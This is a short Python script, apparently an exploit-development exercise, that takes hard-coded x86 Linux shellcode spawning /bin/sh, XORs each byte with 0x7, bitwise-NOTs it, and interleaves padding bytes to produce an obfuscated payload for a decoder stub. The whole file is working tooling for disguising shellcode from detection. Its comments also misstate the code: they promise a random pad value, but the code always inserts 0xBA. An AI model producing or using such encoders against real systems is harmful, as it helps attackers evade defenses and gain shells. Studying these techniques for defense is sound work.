#!/usr/bin/python3

# Python Custom Shellcode Encoder
# Shellcode is XOR encoded with a key of 0x7 and then NOT encoded
# Next, a random number between 1 and 100 is inserted to pad the shellcode

import random

shellcode = bytearray(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

#e_shellcode = ""

def encode(shellcode):

        encoded = ""
        encoded2 = ""

        print("[*] Encoded shellcode:")

        for x in shellcode:

                rand = random.randint(1,100)
                # XOR x with 0x7
                y = x ^ 0x7
                z = ~y
                encoded += '\\x'
                encoded += '%02x' % (z & 0xff)
                # Insert random number between 1 and 100
                encoded += '\\x%02x' % 0xBA

                encoded2 += '0x'
                encoded2 += '%02x,' % (z & 0xff)
                encoded2 += '0x%02x,' % 0xBA

        return encoded, encoded2

def decode(e_shellcode):

        decoded = ""
        decoded2 = ""

        print("\n[*] Decoded shellcode:")

        for i in range(0, len(e_shellcode)):
                # XOR x with 0x7
                y = ~ e_shellcode[i] & 0xff
                z = y ^ 0x7

                # Skip every other padding byte
                if i  % 2 != 0:
                        continue

                decoded += '\\x'
                decoded += '%02x' % z

                decoded2 += '0x'
                decoded2 += '%02x,' % z

        return decoded, decoded2

def main():

        # Add a 0xbb as markers for end of encoded shellcode
        encoded, encoded2 = encode(shellcode)
        #print('\\'.join(encoded.split('\\')[:-1]) + '\\xbb')
        print(','.join(encoded2.split(',')[:-2]) + ",0xbb")

        #decoded, decoded2 = decode(e_shellcode)
        #print(decoded)
        #print(decoded2[:-1])

if __name__ == "__main__":
        main()